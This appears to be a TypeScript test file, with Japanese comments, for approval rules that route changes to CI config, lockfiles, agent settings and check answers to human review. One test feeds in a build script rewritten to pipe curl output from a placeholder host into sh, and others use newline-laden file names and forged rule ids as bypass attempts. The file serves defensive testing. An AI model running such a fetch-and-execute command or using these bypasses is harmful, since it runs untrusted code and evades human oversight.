import { describe, expect, it } from "vitest";
import { matchesGlob } from "../src/domain/path-glob.js";
import {
  APPROVAL_RULE_FLOOR,
  type ApprovalRule,
  approvalHits,
  effectiveApprovalHits,
  MINIMUM_RELEASE_AGE_DAYS,
  renovateException,
  withApprovalRuleFloor,
} from "../src/factory/approval-rules.js";
import type { ChangedFile, ChangeSet } from "../src/factory/change.js";
import {
  addsUnmatchedLines,
  isPinOnlyPatch,
  isVersionOnlyPatch,
  maskVersions,
} from "../src/factory/version-lines.js";
import {
  actorChange,
  daysBeforeNow,
  FRESH_RELEASE,
  LOCK_BUMP,
  modified,
  NOW,
  OLD_RELEASE,
  RENOVATE_APP_ID,
  renovateChange,
  ZOD_BUMP,
} from "./factory-fixtures.js";

const CONTEXT = { renovateAppId: RENOVATE_APP_ID, now: NOW };

/** 依存更新の例外を当てた後の、承認ルールの当たり */
function exemptedHits(change: ChangeSet, rules: readonly ApprovalRule[]) {
  return effectiveApprovalHits(change, rules, renovateException(change, CONTEXT));
}

function floorReasons(files: ChangedFile[], kind: Parameters<typeof actorChange>[0] = "fix") {
  return approvalHits(actorChange(kind, files), APPROVAL_RULE_FLOOR).map((hit) => hit.rule.id);
}

/** 下限の規則ごとに、当たるはずのパス。glob の一覧から作らず、手で書く */
const FLOOR_CASES: readonly (readonly [string, string])[] = [
  [".github/workflows/verify.yml", "checks-config"],
  ["mise.toml", "checks-config"],
  ["apps/web/tsconfig.json", "checks-config"],
  ["apps/web/vitest.config.ts", "checks-config"],
  ["renovate.json", "checks-config"],
  ["REVIEW.md", "checks-config"],
  ["pnpm-lock.yaml", "lockfile-and-manifest"],
  ["src-tauri/Cargo.lock", "lockfile-and-manifest"],
  ["apps/web/package.json", "lockfile-and-manifest"],
  [".claude/settings.json", "agent-and-factory-config"],
  [".factory/policy.yaml", "agent-and-factory-config"],
  ["verify/expected.json", "check-answers"],
  ["snapshots/home.png", "check-answers"],
  ["apps/web/snapshots/home.png", "check-answers"],
  ["src/__snapshots__/app.test.ts.snap", "check-answers"],
  ["src-tauri/capabilities/default.json", "check-answers"],
  // capabilities 以外で Tauri の権限を広げられる場所
  ["src-tauri/permissions/default.toml", "check-answers"],
  ["src-tauri/tauri.conf.json", "check-answers"],
  ["src-tauri/tauri.conf.json5", "check-answers"],
  ["src-tauri/tauri.macos.conf.json", "check-answers"],
  ["src-tauri/Tauri.toml", "check-answers"],
  // mise.toml より強い設定と、ファイルで書くタスク
  ["mise.local.toml", "checks-config"],
  [".mise.local.toml", "checks-config"],
  ["mise.ci.toml", "checks-config"],
  [".config/mise.toml", "checks-config"],
  [".config/mise/config.toml", "checks-config"],
  [".config/mise/conf.d/extra.toml", "checks-config"],
  [".mise/config.toml", "checks-config"],
  [".mise/tasks/verify", "checks-config"],
  ["mise/config.toml", "checks-config"],
  [".mise-tasks/verify", "checks-config"],
  ["apps/web/mise-tasks/check", "checks-config"],
  ["packages/core/src/factory/approval-rules.ts", "factory-parts"],
  // 改行類の文字をファイル名に入れても、`**` の規則から外れない
  // 下限の glob ごとに1つ以上。どれか1つを消すか打ち間違えると、ここが落ちる
  ["CODEOWNERS", "checks-config"],
  ["docs/CODEOWNERS", "checks-config"],
  [".mise.toml", "checks-config"],
  ["mise.lock", "checks-config"],
  [".tool-versions", "checks-config"],
  [".npmrc", "checks-config"],
  ["apps/web/.npmrc", "checks-config"],
  ["biome.json", "checks-config"],
  ["biome.jsonc", "checks-config"],
  ["vitest.workspace.ts", "checks-config"],
  ["apps/web/vite.config.ts", "checks-config"],
  ["playwright.config.ts", "checks-config"],
  ["wdio.conf.ts", "checks-config"],
  ["wdio.e2e.conf.ts", "checks-config"],
  ["stryker.config.mjs", "checks-config"],
  ["stryker.conf.json", "checks-config"],
  [".stryker.conf.js", "checks-config"],
  [".cargo/mutants.toml", "checks-config"],
  ["eslint.config.js", "checks-config"],
  [".eslintrc.json", "checks-config"],
  ["prettier.config.js", "checks-config"],
  [".prettierrc", "checks-config"],
  ["rustfmt.toml", "checks-config"],
  [".rustfmt.toml", "checks-config"],
  ["clippy.toml", "checks-config"],
  ["src-tauri/.cargo/config", "checks-config"],
  [".cargo/config.toml", "checks-config"],
  [".swiftlint.yml", "checks-config"],
  ["Makefile", "checks-config"],
  ["GNUmakefile", "checks-config"],
  ["justfile", "checks-config"],
  [".justfile", "checks-config"],
  ["lefthook.yml", "checks-config"],
  [".pre-commit-config.yaml", "checks-config"],
  ["renovate.json5", "checks-config"],
  [".renovaterc.json", "checks-config"],
  [".pinact.yaml", "checks-config"],
  ["betterleaks.toml", "checks-config"],
  ["package-lock.json", "lockfile-and-manifest"],
  ["npm-shrinkwrap.json", "lockfile-and-manifest"],
  ["yarn.lock", "lockfile-and-manifest"],
  ["bun.lock", "lockfile-and-manifest"],
  ["bun.lockb", "lockfile-and-manifest"],
  ["go.sum", "lockfile-and-manifest"],
  ["Package.resolved", "lockfile-and-manifest"],
  ["uv.lock", "lockfile-and-manifest"],
  ["poetry.lock", "lockfile-and-manifest"],
  ["pdm.lock", "lockfile-and-manifest"],
  ["Pipfile.lock", "lockfile-and-manifest"],
  ["Gemfile.lock", "lockfile-and-manifest"],
  ["deno.lock", "lockfile-and-manifest"],
  ["pnpm-workspace.yaml", "lockfile-and-manifest"],
  ["src-tauri/Cargo.toml", "lockfile-and-manifest"],
  ["go.mod", "lockfile-and-manifest"],
  ["Package.swift", "lockfile-and-manifest"],
  ["pyproject.toml", "lockfile-and-manifest"],
  ["requirements.txt", "lockfile-and-manifest"],
  ["requirements-dev.txt", "lockfile-and-manifest"],
  ["requirements/base.txt", "lockfile-and-manifest"],
  ["constraints.txt", "lockfile-and-manifest"],
  ["Pipfile", "lockfile-and-manifest"],
  ["Gemfile", "lockfile-and-manifest"],
  ["deno.json", "lockfile-and-manifest"],
  ["deno.jsonc", "lockfile-and-manifest"],
  ["AGENTS.md", "agent-and-factory-config"],
  [".goals/config.yaml", "agent-and-factory-config"],
  ["apps/web/CLAUDE.md", "agent-and-factory-config"],
  ["fakes/api.json", "check-answers"],
  ["known-bad/weaken-test/meta.yaml", "check-answers"],
  ["known-good/rename/meta.yaml", "check-answers"],
  ["src-tauri/Tauri.ios.toml", "check-answers"],
  ["packages/ent/src/cli.ts", "factory-parts"],
  ["packages/check/src/index.ts", "factory-parts"],
  ["packages/governor/src/index.ts", "factory-parts"],
  ["presets/base/policy.yaml", "factory-parts"],
  // ディレクトリそのもの（シンボリックリンクで置き換えた場合など）
  [".mise", "checks-config"],
  ["apps/web/mise-tasks", "checks-config"],
  ["src-tauri/capabilities", "check-answers"],
  [".github/workflows/deploy\u2028.yml", "checks-config"],
  [".claude/commands/x\n.md", "agent-and-factory-config"],
  ["a\rb/package.json", "lockfile-and-manifest"],
];

describe("承認ルールの下限", () => {
  it.each(FLOOR_CASES)("%s は %s に当たる", (path, id) => {
    expect(floorReasons([modified(path)])).toContain(id);
  });

  it.each([["src/app.ts"], ["docs/guide.md"], ["README.md"], ["src/verify.ts"]])(
    "%s はどれにも当たらない",
    (path) => {
      expect(floorReasons([modified(path)])).toEqual([]);
    },
  );

  it("下限の glob は、どれも上の表のどこかで当たっている", () => {
    // 表に無い glob は、消しても打ち間違えてもどのテストも落ちない。glob を足したら表にも足す。
    const pinned = FLOOR_CASES.map(([path]) => path);
    const unpinned = APPROVAL_RULE_FLOOR.flatMap((rule) => rule.paths ?? []).filter(
      (glob) => !pinned.some((path) => matchesGlob(path, glob)),
    );

    expect(unpinned).toEqual([]);
  });

  it("rename は新しい側も見る。規則の中へ入れる移動も人がマージする", () => {
    const moved: ChangedFile = {
      path: "verify/expected.json",
      previousPath: "src/expected.json",
      status: "renamed",
    };

    const hits = approvalHits(actorChange("refactor", [moved]), APPROVAL_RULE_FLOOR);

    expect(hits.map((hit) => [hit.rule.id, hit.files])).toEqual([
      ["check-answers", ["verify/expected.json"]],
    ]);
  });

  it("rename は古い側も見る。規則の外へ出す移動も人がマージする", () => {
    const moved: ChangedFile = {
      path: "src/expected.json",
      previousPath: "verify/expected.json",
      status: "renamed",
    };

    const hits = approvalHits(actorChange("refactor", [moved]), APPROVAL_RULE_FLOOR);

    expect(hits.map((hit) => [hit.rule.id, hit.files])).toEqual([
      ["check-answers", ["verify/expected.json"]],
    ]);
  });

  it("削除にも当たる。検査の正解を消すのは書き換えるのと同じ重さになる", () => {
    const removed: ChangedFile = { path: "known-bad/weaken-test/meta.yaml", status: "removed" };

    expect(floorReasons([removed])).toEqual(["check-answers"]);
  });

  it("大文字小文字を変えても当たる", () => {
    expect(floorReasons([modified(".GitHub/workflows/verify.yml")])).toContain("checks-config");
  });
});

describe("設定から足す承認ルール", () => {
  it("種別だけの規則は、その種別の変更すべてに当たる", () => {
    const rules = [{ kinds: ["migration" as const], reason: "永続データの形式" }];

    expect(approvalHits(actorChange("migration", [modified("src/db.ts")]), rules)).toEqual([
      { rule: rules[0], files: [] },
    ]);
    expect(approvalHits(actorChange("fix", [modified("src/db.ts")]), rules)).toEqual([]);
  });

  it("paths と kinds の両方を書いた規則は、両方を満たしたときだけ当たる", () => {
    const rules = [{ paths: ["src/calc/**"], kinds: ["feat" as const], reason: "x" }];

    expect(approvalHits(actorChange("feat", [modified("src/calc/tax.ts")]), rules)).toHaveLength(1);
    expect(approvalHits(actorChange("fix", [modified("src/calc/tax.ts")]), rules)).toHaveLength(0);
    expect(approvalHits(actorChange("feat", [modified("src/ui/tax.ts")]), rules)).toHaveLength(0);
  });
});

describe("依存更新の例外", () => {
  it("Renovate がバージョンの行だけを動かし、公開から日が経った deps は4条件を満たす", () => {
    expect(renovateException(renovateChange([ZOD_BUMP, LOCK_BUMP]), CONTEXT)).toEqual({
      holds: true,
      unmet: [],
    });
  });

  it("作成者を App の ID で見る。Actor（governor の App）が同じ差分を出しても外れる", () => {
    const change = {
      ...renovateChange([ZOD_BUMP, LOCK_BUMP]),
      author: actorChange("deps", []).author,
    };

    expect(renovateException(change, CONTEXT).unmet).toEqual(["author"]);
  });

  it("Renovate の App がプロファイルに無ければ成り立たない", () => {
    const result = renovateException(renovateChange([ZOD_BUMP]), { renovateAppId: null, now: NOW });

    expect(result.unmet).toEqual(["author"]);
  });

  it("種別が deps でなければ外れる", () => {
    const change = { ...renovateChange([ZOD_BUMP]), kind: "feat" as const };

    expect(renovateException(change, CONTEXT).unmet).toEqual(["kind"]);
  });

  it("src も触る deps の PR は外れる（known-bad）", () => {
    const change = renovateChange([ZOD_BUMP, LOCK_BUMP, modified("src/app.ts", ["a"], ["b"])]);

    expect(renovateException(change, CONTEXT).unmet).toEqual(["version_lines_only"]);
  });

  it("公開からの日数が足りなければ外れる", () => {
    expect(renovateException(renovateChange([ZOD_BUMP], FRESH_RELEASE), CONTEXT).unmet).toEqual([
      "release_age",
    ]);
  });

  it("公開からの日数は、ちょうど下限の日数から満たす", () => {
    // 設定では短くできない値なので、値そのものも固定する。
    expect(MINIMUM_RELEASE_AGE_DAYS).toBe(7);

    const exactly = renovateChange([ZOD_BUMP], daysBeforeNow(7));
    const justShort = renovateChange([ZOD_BUMP], daysBeforeNow(7, 1));

    expect(renovateException(exactly, CONTEXT).holds).toBe(true);
    expect(renovateException(justShort, CONTEXT).unmet).toEqual(["release_age"]);
  });

  it("新しいバージョンのうち1つでも日が浅ければ外れる", () => {
    const change = {
      ...renovateChange([ZOD_BUMP]),
      releases: [
        { name: "zod", releasedAt: OLD_RELEASE },
        { name: "left-pad", releasedAt: FRESH_RELEASE },
      ],
    };

    expect(renovateException(change, CONTEXT).unmet).toEqual(["release_age"]);
  });

  it("間接の依存のバージョンも日数を見る。lockfile にだけ入る公開直後のバージョンで外れる", () => {
    // Renovate の本文に並ぶのは直接の依存だけ。間接の依存は呼ぶ側が lockfile から読んで
    // releases に入れる。
    const change = {
      ...renovateChange([ZOD_BUMP, LOCK_BUMP]),
      releases: [
        { name: "zod", releasedAt: OLD_RELEASE },
        { name: "zod>transitive", releasedAt: FRESH_RELEASE },
      ],
    };

    expect(renovateException(change, CONTEXT).unmet).toEqual(["release_age"]);
  });

  it("lockfile に新しいパッケージが入るなら、バージョンの行だけとはみなさない", () => {
    const change = { ...renovateChange([ZOD_BUMP, LOCK_BUMP]), addedPackages: ["new-transitive"] };

    expect(renovateException(change, CONTEXT).unmet).toEqual(["version_lines_only"]);
  });

  it("lockfile の新しいパッケージを読めなかったなら、バージョンの行だけとはみなさない", () => {
    const { addedPackages: _, ...change } = renovateChange([ZOD_BUMP, LOCK_BUMP]);

    expect(renovateException(change, CONTEXT).unmet).toEqual(["version_lines_only"]);
    // lockfile に触れない依存更新は、読めなくても関係しない。
    const { addedPackages: __, ...manifestOnly } = renovateChange([ZOD_BUMP]);
    expect(renovateException(manifestOnly, CONTEXT).holds).toBe(true);
  });

  // 中身はバージョンの行だけ。状態だけが modified から外れる。
  const ZOD_PATCH = ZOD_BUMP.patch ?? { added: [], removed: [] };

  it.each<[string, ChangedFile]>([
    ["lockfile の追加", { path: "pnpm-lock.yaml", status: "added" }],
    ["lockfile の削除", { path: "pnpm-lock.yaml", status: "removed" }],
    [
      "lockfile の rename",
      { path: "pnpm-lock.yaml", previousPath: "old/pnpm-lock.yaml", status: "renamed" },
    ],
    ["manifest の追加", { path: ZOD_BUMP.path, patch: ZOD_PATCH, status: "added" }],
    ["manifest の削除", { path: ZOD_BUMP.path, patch: ZOD_PATCH, status: "removed" }],
    [
      "manifest の rename",
      {
        path: ZOD_BUMP.path,
        patch: ZOD_PATCH,
        status: "renamed",
        previousPath: "old/package.json",
      },
    ],
  ])("%s はバージョンの更新ではない", (_, file) => {
    expect(renovateException(renovateChange([file]), CONTEXT).unmet).toEqual([
      "version_lines_only",
    ]);
  });

  it("ファイルが1つも無い変更は、バージョンの行だけとはみなさない", () => {
    expect(renovateException(renovateChange([]), CONTEXT).unmet).toEqual(["version_lines_only"]);
  });

  it("公開日の分からないバージョンは、日数を満たさないものとして扱う", () => {
    const change = { ...renovateChange([ZOD_BUMP]), releases: [] };

    expect(renovateException(change, CONTEXT).unmet).toEqual(["release_age"]);
  });

  it("manifest の patch が無いときは、バージョンの行だけとはみなさない", () => {
    const change = renovateChange([{ path: "package.json", status: "modified" }]);

    expect(renovateException(change, CONTEXT).unmet).toEqual(["version_lines_only"]);
  });

  it("ワークフローの uses の sha の付け替えは例外に入る", () => {
    const pin = modified(
      ".github/workflows/verify.yml",
      [`      - uses: actions/checkout@${"b".repeat(40)} # v7.0.2`],
      [`      - uses: actions/checkout@${"a".repeat(40)} # v7.0.1`],
    );

    expect(renovateException(renovateChange([pin]), CONTEXT).holds).toBe(true);
    expect(exemptedHits(renovateChange([pin]), APPROVAL_RULE_FLOOR)).toEqual([]);
  });

  it("例外が外すのは lockfile と CI の規則だけで、factory の部品は外さない", () => {
    const change = renovateChange([
      modified("packages/ent/package.json", ['    "zod": "^4.4.4",'], ['    "zod": "^4.4.3",']),
    ]);

    const hits = exemptedHits(change, APPROVAL_RULE_FLOOR);

    expect(hits.map((hit) => hit.rule.id)).toEqual(["factory-parts"]);
  });

  it("例外は設定から足した規則を外さない", () => {
    const rules = [
      ...APPROVAL_RULE_FLOOR,
      { paths: ["**/package.json"], reason: "プロファイルの規則" },
    ];

    const hits = exemptedHits(renovateChange([ZOD_BUMP]), rules);

    expect(hits.map((hit) => hit.rule.reason)).toEqual(["プロファイルの規則"]);
  });

  it("バージョンの行と読めない manifest（pip の ==）は、例外に入らず人がマージする", () => {
    const change = renovateChange([
      modified("requirements.txt", ["requests==2.32.0"], ["requests==2.31.0"]),
    ]);

    expect(renovateException(change, CONTEXT).unmet).toEqual(["version_lines_only"]);
    expect(exemptedHits(change, APPROVAL_RULE_FLOOR).map((hit) => hit.rule.id)).toEqual([
      "lockfile-and-manifest",
    ]);
  });

  it("下限の id を名乗っただけの規則は、例外で外さない", () => {
    const forged: ApprovalRule = {
      id: "lockfile-and-manifest",
      paths: ["**/package.json"],
      reason: "id を名乗った規則",
    };

    const hits = exemptedHits(renovateChange([ZOD_BUMP]), [...APPROVAL_RULE_FLOOR, forged]);

    expect(hits.map((hit) => hit.rule.reason)).toEqual(["id を名乗った規則"]);
  });

  it.each([
    [".claude/tools/package.json", "agent-and-factory-config"],
    [".factory/tools/package.json", "agent-and-factory-config"],
    ["verify/package.json", "check-answers"],
    ["fakes/package.json", "check-answers"],
    ["snapshots/package.json", "check-answers"],
  ])("例外が成り立っても、%s のバージョンの更新は %s で人がマージする", (path, id) => {
    const change = renovateChange([
      modified(path, ['    "zod": "^4.4.4",'], ['    "zod": "^4.4.3",']),
    ]);

    expect(renovateException(change, CONTEXT).holds).toBe(true);
    expect(exemptedHits(change, APPROVAL_RULE_FLOOR).map((hit) => hit.rule.id)).toEqual([id]);
  });

  it("下限を渡し忘れても、例外の判定は下限を足し直してから行う", () => {
    const change = actorChange("fix", [modified("mise.toml")]);

    expect(exemptedHits(change, []).map((hit) => hit.rule.id)).toEqual(["checks-config"]);
  });

  it("lockfile が動く feat の PR は、例外に入らず人がマージする（known-bad）", () => {
    const change = actorChange("feat", [modified("src/app.ts", ["a"], ["b"]), LOCK_BUMP]);

    const hits = exemptedHits(change, APPROVAL_RULE_FLOOR);

    expect(hits.map((hit) => hit.rule.id)).toEqual(["lockfile-and-manifest"]);
  });
});

describe("判定に使う承認ルールの下限", () => {
  it("下限の無いルールを渡されても、下限を足し直す", () => {
    expect(withApprovalRuleFloor([])).toEqual([...APPROVAL_RULE_FLOOR]);
  });

  it("下限が入っていれば重ねない", () => {
    const extra = { paths: ["src/calc/**"], reason: "重要な計算" };

    expect(withApprovalRuleFloor([...APPROVAL_RULE_FLOOR, extra])).toEqual([
      ...APPROVAL_RULE_FLOOR,
      extra,
    ]);
  });

  it("複製した下限も重ねない", () => {
    expect(withApprovalRuleFloor(structuredClone([...APPROVAL_RULE_FLOOR]))).toEqual([
      ...APPROVAL_RULE_FLOOR,
    ]);
  });

  it("同じ id を名乗って中身を空にした規則では、下限は消えない", () => {
    const forged = { id: "checks-config" as const, paths: [], reason: "空" };

    const rules = withApprovalRuleFloor([forged]);

    expect(
      approvalHits(actorChange("docs", [modified("mise.toml")]), rules).map((h) => h.rule.reason),
    ).toEqual(["CI・verify・lint の設定"]);
  });
});

describe("バージョンの行だけかを見る", () => {
  it.each([
    ['"zod": "^4.4.3",'],
    ['serde = { version = "1.0.210", features = ["derive"] }'],
    ["\tgithub.com/example/lib v1.2.3"],
    ['"packageManager": "pnpm@10.20.0",'],
    ['.package(url: "https://example.invalid/lib.git", from: "5.0.0"),'],
  ])("%s のバージョンを伏せる", (line) => {
    expect(maskVersions(line).count).toBeGreaterThan(0);
  });

  it("数字の設定値や、語の途中の数字はバージョンとみなさない", () => {
    expect(maskVersions('"port": "3000",').count).toBe(0);
    expect(maskVersions('"build": "node scripts/a.1.2.js",').count).toBe(0);
  });

  it("バージョンだけが変わった manifest の差分を認める", () => {
    expect(isVersionOnlyPatch({ added: ['"zod": "^4.4.4",'], removed: ['"zod": "^4.4.3",'] })).toBe(
      true,
    );
    expect(
      isVersionOnlyPatch({
        added: ['serde = { version = "1.0.211", features = ["derive"] }'],
        removed: ['serde = { version = "1.0.210", features = ["derive"] }'],
      }),
    ).toBe(true);
  });

  it("scripts の書き換え、依存の追加、名前の付け替えは認めない", () => {
    // scripts を書き換えれば、次の install か verify で任意のコマンドが走る。
    expect(
      isVersionOnlyPatch({
        added: ['"build": "curl https://example.invalid | sh",'],
        removed: ['"build": "tsc",'],
      }),
    ).toBe(false);
    expect(
      isVersionOnlyPatch({ added: ['"zod": "^4.4.3",', '"left-pad": "^1.3.0",'], removed: [] }),
    ).toBe(false);
    expect(
      isVersionOnlyPatch({ added: ['"zod-fork": "^4.4.4",'], removed: ['"zod": "^4.4.3",'] }),
    ).toBe(false);
  });

  it("何も変わっていない対や、空の差分は認めない", () => {
    expect(isVersionOnlyPatch({ added: [], removed: [] })).toBe(false);
    expect(isVersionOnlyPatch({ added: ['"zod": "^4.4.3",'], removed: ['"zod": "^4.4.3",'] })).toBe(
      false,
    );
  });

  it("ワークフローは sha で固定した uses の付け替えだけを認める", () => {
    const sha = (c: string) => c.repeat(40);

    expect(
      isPinOnlyPatch({
        added: [`- uses: actions/setup-node@${sha("b")} # v5.1.0`],
        removed: [`- uses: actions/setup-node@${sha("a")} # v5.0.0`],
      }),
    ).toBe(true);
    // タグでの指定はバージョンを固定していない
    expect(
      isPinOnlyPatch({
        added: ["- uses: actions/setup-node@v5"],
        removed: [`- uses: actions/setup-node@${sha("a")} # v5.0.0`],
      }),
    ).toBe(false);
    // 別の action に差し替える
    expect(
      isPinOnlyPatch({
        added: [`- uses: someone/setup-node@${sha("b")} # v5.1.0`],
        removed: [`- uses: actions/setup-node@${sha("a")} # v5.0.0`],
      }),
    ).toBe(false);
    // uses 以外の行（permissions など）が動く
    expect(isPinOnlyPatch({ added: ["  contents: write"], removed: ["  contents: read"] })).toBe(
      false,
    );
  });

  it("付け替えで説明できない行を足していれば、新しい依存とみなす", () => {
    expect(addsUnmatchedLines({ added: ['"zod": "^4.4.4",'], removed: ['"zod": "^4.4.3",'] })).toBe(
      false,
    );
    expect(addsUnmatchedLines({ added: ['"left-pad": "^1.3.0",'], removed: [] })).toBe(true);
  });
});
